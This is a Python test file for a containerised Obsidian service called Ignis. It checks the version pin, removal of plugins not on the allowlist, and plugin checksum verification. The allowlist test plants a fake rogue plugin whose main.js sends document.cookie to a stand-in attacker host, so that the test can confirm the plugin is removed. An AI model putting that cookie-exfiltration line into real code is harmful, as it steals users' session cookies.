"""SPEC §16.17 (plugin allowlist enforced at startup) and §16.18 (Obsidian version pin)."""

import json
import re

from harness import Stack, plugin_allowlist


def test_16_18_ignis_runs_exactly_the_pinned_obsidian_version(stack: Stack) -> None:
    config = json.loads(stack.compose("config", "--format", "json").stdout)
    pinned = config["services"]["ignis"]["environment"]["OBSIDIAN_VERSION"]
    logs = stack.compose("logs", "--no-color", "ignis").stdout
    versions = re.findall(r"Obsidian (?:ready|already set up) \(v([0-9.]+)\)", logs)
    assert versions, "no Obsidian startup line in the Ignis log"
    assert versions[-1] == pinned


def test_16_17_unlisted_plugins_are_gone_after_restart_and_allowlisted_remain(stack: Stack) -> None:
    plugins = stack.root / "data" / "ignis-plugins"
    assert sorted(p.name for p in plugins.iterdir()) == ["good-plugin"]
    rogue = plugins / "rogue-plugin"
    rogue.mkdir()
    (rogue / "main.js").write_text("fetch('https://attacker.example/' + document.cookie)")
    # Installing from the UI writes into .obsidian/plugins, which Ignis sees read-only.
    attempt = stack.compose(
        "exec",
        "-T",
        "ignis",
        "sh",
        "-c",
        "mkdir /vaults/${VAULT_NAME:-Docs}/.obsidian/plugins/ui-install",
        check=False,
    )
    assert attempt.returncode != 0
    stack.compose("stop", "ignis")
    up = stack.compose("up", "-d", "--wait", "--wait-timeout", "300", "ignis", check=False)
    assert up.returncode == 0, up.stderr
    assert sorted(p.name for p in plugins.iterdir()) == ["good-plugin"]
    listed = stack.compose(
        "exec", "-T", "ignis", "sh", "-c", "ls /vaults/${VAULT_NAME:-Docs}/.obsidian/plugins"
    ).stdout.split()
    assert listed == ["good-plugin"]
    community = (stack.root / "vault" / ".obsidian" / "community-plugins.json").read_text()
    assert '"good-plugin"' in community
    assert "rogue" not in community


def test_a_checksum_mismatch_stops_ignis_from_starting(stack: Stack) -> None:
    bad = stack.root / "bad-allowlist.yaml"
    bad.write_text(plugin_allowlist(main_sha="f" * 64))
    (stack.root / "data" / "ignis-plugins" / "good-plugin" / "main.js").write_text("tampered")
    run = stack.compose(
        "run",
        "--rm",
        "--no-deps",
        "-v",
        f"{bad}:/kit/ignis-plugins.yaml:ro",
        "ignis-init",
        check=False,
    )
    assert run.returncode != 0
    assert "checksum mismatch" in run.stdout + run.stderr
    good = stack.compose(
        "run", "--rm", "--no-deps", "ignis-init", check=False
    )  # restore for later tests
    assert good.returncode == 0, good.stderr
